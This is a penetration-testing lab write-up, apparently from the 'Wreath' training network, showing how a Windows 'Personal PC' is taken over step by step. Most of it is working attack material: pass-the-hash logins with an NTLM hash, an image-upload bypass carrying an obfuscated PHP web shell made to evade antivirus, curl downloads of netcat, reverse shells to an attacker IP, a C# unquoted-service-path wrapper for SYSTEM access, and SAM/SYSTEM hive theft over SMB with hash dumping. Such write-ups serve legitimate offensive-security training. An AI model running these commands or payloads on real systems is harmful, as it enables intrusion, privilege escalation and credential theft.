# Personal PC

---

## 1.0 Scanning the Personal PC with a portscan script

We know that our attack host can’t reach the Personal PC directly. But we are able to setup a VPN on the 57.0/24 network trough sshuttle, which we did with the webserver. 

On the GitStack server (Windows Server 2019) we found the Administrator’s NTLM hash. We can now use that hash with Evil-WinRM to login to the server and Invoke a portscan script from the Empire directory.

Evil-WinRM command:

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
```

![Untitled](Personal%20P%20ec072/Untitled.png)

- As you can see, we now have a Evil-WinRM shell on the GitStack server as Administrator

Now that we connected the local directory [/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/] with the -s with Evil-WinRM, we can use all the scripts inside this directory on the GitStack server. Including a portscan script.

Before we can do that, we need to Invoke the script like so:

```bash
Invoke-Portscan.ps1
```

![Untitled](Personal%20P%20ec072/Untitled%201.png)

Lets scan the Personal PC (10.200.57.100):

```bash
Invoke-Portscan -Hosts 10.200.57.100 -TopPorts 50
```

- This toke a few seconds but there were some results returned

I found out that on the Personal PC, two ports were running. Port 80 and 3389. 

![Untitled](Personal%20P%20ec072/Untitled%202.png)

---

## 2.0 Pivoting to the Personal PC

Since we need a hash or password to login with RDP (Port 3389), it thought it was a good idea to setup a Socks5 proxy with Chisel trough the already running VPN with sshuttle. When we do just that, we can use that Socks5 proxy to talk with port 80 running on the Personal PC.

### 2.1 uploading chisel to the GitStack server & opening a TCP port

We can upload a static binary of chisel to the GitStack server with Evil-WinRM like so:

```bash
upload chisel-Incendium.exe
```

- Assuming that the file chisel-Incendium exists on the locally connected machine

Doing just that as you can see here:

![Untitled](Personal%20P%20ec072/Untitled%203.png)

We now have to open a TCP port in the firewall in order to get this to work. We can to that by adding a rule in the advfirewall:

```bash
netsh advfirewall firewall add rule name="Chisel-Incendium" dir=in action=allow protocol=tcp localport=47000
```

- This rule is named “Chisel-Incendium” and opened a localport 47000, which we will be using later to connect back on.

---

## 3.0 Using chisel to create a proxy

Now that we have both a chisel binary on our local attacking machine and the GitStack server and opened a TCP port for the proxy, we can start a chisel server on this port we opened:

```bash
.\chisel-Incendium.exe server -p 47000 --socks5
```

- This server runs now on port 47000 as socks5

![Untitled](Personal%20P%20ec072/Untitled%204.png)

On my local attacking machine (kali) I need to connect myself to this server with a chisel client:

```bash
chisel client 10.200.57.150:47000 9090:socks
```

- I first connect to the GitStack server on port 47000, and I setup a socks proxy running on port 9090.

Now everything coming in at 9090 locally, will get forwarded to 10.200.57.150. This is a proxy inside a VPN, which makes it slow to work with.

---

## 4.0 The webserver on port 80

As expected, we find a copy of the website running on the webserver (10.200.57.200):

![Untitled](Personal%20P%20ec072/Untitled%205.png)

If there are any differences here then they are clearly not going to be immediately visible.

### 4.1 Website repository

Taking a step back, we can use the GitStack server to find the repository for this website and check the source code.

While exploring the GitStack server I quickly find out a github repository, which is likely the repository for the website running on the Personal PC:

 

![Untitled](Personal%20P%20ec072/Untitled%206.png)

We can use Gittools locally to extract the branches for this repository and look at the source code. Just like we used upload with chisel, we can use download to download this Website.git file:

![Untitled](Personal%20P%20ec072/Untitled%207.png)

Using GitTools extractor to reformat this repository into a readable format:

```bash
../GitTools/Extractor/extractor.sh . Website
```

- We give . as the path which [extractor.sh](http://extractor.sh) needs to extract. It searches for a .git file namely. After doing so, I call the output file “Website”

![Untitled](Personal%20P%20ec072/Untitled%208.png)

Exploring the new Website directory, I found out three commits:

![Untitled](Personal%20P%20ec072/Untitled%209.png)

I used this bash one-liner to order the commits:

```bash
eparator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
```

---

### 4.2 PHP vulnerability discovered in index.php

From the order of the commits I knew that we code running on the Personal PC was this commit:

```bash
2-345ac8b236064b431fa43f53d91c98c4834ef8f3
```

- This is the commit that is now live on the Personal PC

Inside this commit is a directory called /resources and a file inside it called index.php:

![Untitled](Personal%20P%20ec072/Untitled%2010.png)

From reading the code, I knew that we are able to upload a image on the website [http://10.200.57.100/resources](http://10.200.57.100/resources). To access this directory, we need to provide a login:

![Untitled](Personal%20P%20ec072/Untitled%2011.png)

With some simple guessing and a known password I found out the credentials to access this directory:  Thomas/i<3ruby

As expected, I found a place to upload images:

![Untitled](Personal%20P%20ec072/Untitled%2012.png)

Looking at the code back in the index.php file, this upload section has two filters:

```bash
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

- The first filter makes sure to split the file extension on the “.” dot and creates a list. Next it takes the second index (1) from this list. Last it checks if this extension is in the list $goodExts, which are jpeg,jpg,png and gif.
    - This means that image.jpg is allowed but image.jpg.php is also allowed!
- The second filter checks the size of the file, which we can pass by using exiftool to add a comment with php code into a existing image.

I tested my idea by adding this php code into a existing image with exiftool:

```bash
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-Incendium.jpeg.php
```

- The php code here is <?php echo \"<pre>Test Payload</pre>\"; die(); ?>
    - This will echo Test Payload on the webpage

Next, I uploaded the created image and navigated to [http://10.200.57.100/resources/uploads/test-Incendium.jpeg.php](http://10.200.57.100/resources/uploads/test-Incendium.jpeg.php) on the website. Which resulted in this output:

![Untitled](Personal%20P%20ec072/Untitled%2013.png)

- As you can see, we see that our PHP code is executed. We can now use this knowledge to gain a reverse shell on the Personal PC.

But we first need to evade the Anti-Virus! 

---

## 6.0 Evading the AV

I evaded the (possible) AV by obfuscating the php reverse shell payload with this online tool:

[https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

The original payload looked as follows:

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

- As you can see, the PHP payload expects a GET request with the parameter “wreath”. The value of the parameter will be executed with shell_exec.

The same payload, but obfuscated:

```php
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```

With exiftool I commented the payload in a image and renamed it as shell-Incendium.jpeg.php:

![Untitled](Personal%20P%20ec072/Untitled%2014.png)

I uploaded the image to the webserver, and accessed it trough the following URL:

[http://10.200.57.100/resources/uploads/shell-incendium.jpeg.php](http://10.200.57.100/resources/uploads/shell-incendium.jpeg.php?wreath=whoami)

![Untitled](Personal%20P%20ec072/Untitled%2015.png)

- We see a error here because we did not provide the ?wreath= parameter.

If we do provide it with the value “whoami”, we can see that the shell is working as expected:

[http://10.200.57.100/resources/uploads/shell-incendium.jpeg.php**?wreath=whoami**](http://10.200.57.100/resources/uploads/shell-incendium.jpeg.php?wreath=whoami)

![Untitled](Personal%20P%20ec072/Untitled%2016.png)

- We see that the shell is running as the user wreath-pc\thomas

We now have RCE on this webserver. Time to get a reverse shell.

---

## 7.0 Reverse shell Personal PC

To get a reverse shell, I decided to go with a static binary of netcat (64bits). Which I first had to copy to the webserver using our in place PHP exploit:

```bash
curl http://10.50.55.63/nc64.exe -o c:\\windows\\temp\\nc-Incendium.exe
```

- I used curl here because it exists on the personal PC
- I put the file in the C:\Windows\Temp directory of the Personal PC

Next, I started listening for incoming connections on my attacking machine and executed the following command with the new netcat binary:

```bash
powershell.exe c:\\windows\\temp\\nc-Incendium3.exe 10.50.55.63 20000 -e cmd.exe
```

- This assumes that there’s a host 10.50.55.63 listening to port 20000 for incoming connections
- I tell netcat to execute cmd.exe when connected, so that we have a command prompt.

![Untitled](Personal%20P%20ec072/Untitled%2017.png)

- As you can see, this worked perfectly.
- Also, the current user seems to have the SeImpersonatePrivilege enabled. This can lead to Privilege Escalation.

---

### 8.0 Privilege Escalation with *Unquoted Service Path*

I used the following command to list non-default services:

```bash
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

Results:

![Untitled](Personal%20P%20ec072/Untitled%2018.png)

- As you can see, the path to the service executable isn’t in quotes “”. This wouldn’t be a problem if there were no spaces in the path. **But there’re spaces in the path.**

Checking which account the service runs under:

```csharp
sc qc SystemExplorerHelpService
```

Results:

![Untitled](Personal%20P%20ec072/Untitled%2019.png)

- The service is running as **LocalSystem!**

**How is this a problem?**

Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. `C:\Directory One\Directory Two\Executable.exe`) then Windows will look for the executable in the following order:

1. `C:\Directory.exe`
2. `C:\Directory One\Directory.exe`
3. `C:\Directory One\Directory Two\Executable.exe`

In order to get this vulnerability to work, we need a folder that we can write to in the specified path of the SystemExplorerService. To find out which permissions I have with the current user I used this command:

```csharp
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

Results:

```csharp
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
**Access : BUILTIN\Users Allow  FullControl <--- Notice this**
```

- As you can see, the group BUILTIN\Users has FullControl over the C:\Program Files (x86)\System Explorer directory. Our current user is in this group, which I check with this command:

```csharp
whoami /groups
```

Results:

![Untitled](Personal%20P%20ec072/Untitled%2020.png)

- As you can see, I am a member of the group that has full access to the directory.

### 8.1 Coding a Wrapper

All we need is one very small "wrapper" program that activates the netcat binary that we already have on the target. To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system).

C# code:

```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-Incendium3.exe", "10.50.55.63 23555 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

Compiling the C# code to a executable is easy with mono:

```csharp
mcs Wrapper.cs
```

![Untitled](Personal%20P%20ec072/Untitled%2021.png)

I started a webserver with Python to copy the executable over to the Personal PC.

```csharp
curl http://10.50.55.63/Wrapper.exe -o %TEMP%\wrapper-Incendium.exe
```

- [http://10.50.55.63/Wrapper.exe](http://10.50.55.63/Wrapper.exe) is the compiled executable on my attacking machine
- %TEMP%\wrapper-Incendium.exe is the output path for the executable

I started to listen for incoming connections on port 23555 (The port I specified in the wrapper code) 

```csharp
nc -lvnp 23555
```

Next I copied the Wrapper.exe to the C:\Program Files (x86)\System Explorer\ path with this command:

```csharp
copy %TEMP%\wrapper-Incendium.exe "C:\Program Files (x86)\System Explorer\System.exe"
```

Now, if we were to restart the SystemExplorerHelpService service, I would receive a reverse shell as the system:

```csharp
sc stop SystemExplorerHelpService
```

- I stop the service here

```csharp
sc start SystemExplorerHelpService
```

- Here I start the service again

Reverse shell as system:

![Untitled](Personal%20P%20ec072/Untitled%2022.png)

---

## 9.0 Exfiltrating NT hashes

Now that we are in the Personal PC as System. We can exfiltrate the SAM hashes with impacket. To accomplish this, we need to setup a SMB server on our own attacking machine and connect to it.

SMB server using the impacket python script:

```csharp
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```

- We made a smbserver with smb2 support with the name “share” and the credentials user:s3cureP@ssword

Lets connect to it trough our reverse system shell:

```csharp
net use \\10.50.55.63\share /USER:user s3cureP@ssword
```

![Untitled](Personal%20P%20ec072/Untitled%2023.png)

- As you can see, we successfully connected to our smb server. We can now go ahead and copy any file to our own attacking machine.

We specifically are interested in the **sam.bak** and the **system.bak** files. Which are located in the SAM Hive of a windows pc. We can save these files trough reg.exe on our attacking machine like so:

```csharp
reg.exe save HKLM\SYSTEM \\10.50.55.63\share\system.bak
```

And

```csharp
reg.exe save HKLM\SAM \\10.50.55.63\share\sam.bak
```

- Notice we are using reg.exe here to save the files to our SMB share, which we connected to earlier.

I used the /opt/impacket/examples/secretsdump.py Python script to dump the hashes of the local users:

```csharp
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- sam.bak and system.bak are now locally saved on my attacking machine

![Untitled](Personal%20P%20ec072/Untitled%2024.png)

NT hash administrator: a05c3c807ceeb48c47252568da284cd2

**Note**: after exfiltrating the local hashes, I deleted the smb share from the compromised PC:

```csharp
net use \\10.50.55.63\share /del
```